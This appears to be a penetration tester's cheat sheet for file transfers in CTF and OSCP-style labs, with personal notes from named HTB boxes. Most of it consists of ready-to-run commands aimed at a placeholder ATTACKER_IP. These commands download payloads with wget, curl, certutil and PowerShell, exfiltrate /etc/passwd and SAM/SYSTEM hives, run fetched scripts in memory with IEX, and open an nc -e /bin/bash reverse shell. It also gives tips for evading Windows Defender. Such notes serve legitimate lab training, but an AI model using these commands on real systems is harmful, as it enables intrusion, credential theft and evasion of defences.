# File Transfers

Comprehensive reference organized by situation. See also [[Reverse-Shells]] for getting shells after transfer.

---

## Linux Target (Attacker to Target)

### Python HTTP server (on Kali)
```bash
python3 -m http.server 80
```

### wget (on target)
```bash
wget http://ATTACKER_IP/file -O /tmp/file
```

### curl
```bash
curl http://ATTACKER_IP/file -o /tmp/file
```

### Netcat
```bash
# Kali:
nc -lvnp 4444 < file
# Target:
nc ATTACKER_IP 4444 > file
```

### SCP (if you have SSH)
```bash
scp file user@TARGET_IP:/tmp/
```

### Bash /dev/tcp (no tools needed)
```bash
cat < /dev/tcp/ATTACKER_IP/80 > file
```

---

## Windows Target (Attacker to Target)

### PowerShell (most common)
```powershell
iwr http://ATTACKER_IP/file -outfile C:\tmp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','C:\tmp\file')
Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile file
```

### certutil (works even when PowerShell is restricted)
```powershell
certutil -urlcache -f http://ATTACKER_IP/file C:\tmp\file
```

### BITSAdmin
```powershell
bitsadmin /transfer job http://ATTACKER_IP/file C:\tmp\file
```

### SMB share (great for Windows -- no file touching disk concerns)
```bash
# Kali:
impacket-smbserver share . -smb2support
```
```powershell
# Target:
copy \\ATTACKER_IP\share\file C:\tmp\file
```
```bash
# Or with creds:
impacket-smbserver share . -smb2support -user test -password test
```
```powershell
# Target:
net use \\ATTACKER_IP\share /user:REDACTED test
copy \\ATTACKER_IP\share\file C:\tmp\file
```

### PowerShell Base64 (bypass download restrictions)
```bash
# Kali:
cat file | base64 -w0 && echo
```
```powershell
# Target:
[IO.File]::WriteAllBytes("C:\tmp\file",[Convert]::FromBase64String("BASE64_STRING"))
```

---

## Target to Attacker (Exfiltration)

### Netcat
```bash
# Kali:
nc -lvnp 4444 > file
# Target:
nc ATTACKER_IP 4444 < file
```

### Python upload server
```bash
# Kali:
python3 -m uploadserver
# Target:
curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/etc/passwd'
```

### SMB (Windows to Kali)
```bash
# Kali:
impacket-smbserver share . -smb2support
```
```powershell
# Target:
copy C:\file \\ATTACKER_IP\share\
```

---

## Tips

- Always `chmod +x` after transferring binaries on Linux
- **`C:\tmp` doesn't exist by default** — use `mkdir C:\tmp` first, or use `C:\Windows\Temp` or `C:\Users\Public`
- `/tmp` exists on all Linux boxes, `/dev/shm` is another option (tmpfs, no disk write)
- SMB is usually the cleanest for Windows — no files written to temp
- If all else fails: base64 encode, copy-paste through shell, decode
- **If transfer hangs**: firewall may block outbound. Try ports 80, 443, or 53
- `python3 -m http.server 80` requires root (port <1024) — use `sudo` or pick port 8000+
- **Windows Defender may quarantine your uploads** — try renaming (nc.exe → n.exe), packing, or using PowerShell in-memory execution:
```powershell
IEX(IWR http://ATTACKER_IP/script.ps1 -UseBasicParsing)
```

## From Your Boxes

> **Buff** (HTB) — SMB share for transferring nc binary when web shell had restricted commands
> - What worked: `impacket-smbserver -smb2support newShare . -username test -password test` on Kali, then from webshell: `net use z: \\TARGET_IP\newShare /u:test test` and `copy z:\nc64.exe .`
> - Lesson: When you have RCE but wget/curl/certutil don't work, SMB share is the most reliable Windows transfer method

> **Lab AD chain** (personal lab) — certutil blocked by permissions, had to use evil-winrm download instead
> - What worked: evil-winrm's built-in `download C:\windows.old\Windows\System32\SAM` and `download C:\windows.old\Windows\System32\SYSTEM`
> - Lesson: certutil can be blocked by AppLocker/permissions. evil-winrm has built-in upload/download that bypasses this

> **Berlin** (Course/OSCP B) — wget and curl for transferring chisel binary and msfvenom ELF payload
> - What worked: `curl http://ATTACKER_IP/shell.elf --output /tmp/shell.elf` then `chmod +x /tmp/shell.elf`
> - Lesson: Always use `/tmp` on Linux targets and `chmod +x` after transfer. Start your HTTP server before running the download command

> **Forest** (HTB) — SMB share + PowerShell for transferring SharpHound and BloodHound output
> - What worked: `smbserver.py share . -smb2support -username df -password df` on Kali, then `net use \\TARGET_IP\share /u:df df` and `copy file \\TARGET_IP\share\` on target
> - Lesson: SMB is bidirectional — use it for both uploading tools AND exfiltrating loot

> **Cockpit** (PG/Linux) — wget for downloading a custom nc binary when system nc lacked -e flag
> - What worked: `wget http://ATTACKER_IP/nc` then `chmod +x nc` then `./nc ATTACKER_IP 9090 -e /bin/bash`
> - Lesson: If target's nc doesn't support -e, upload a netcat binary from github.com/H74N/netcat-binaries that does
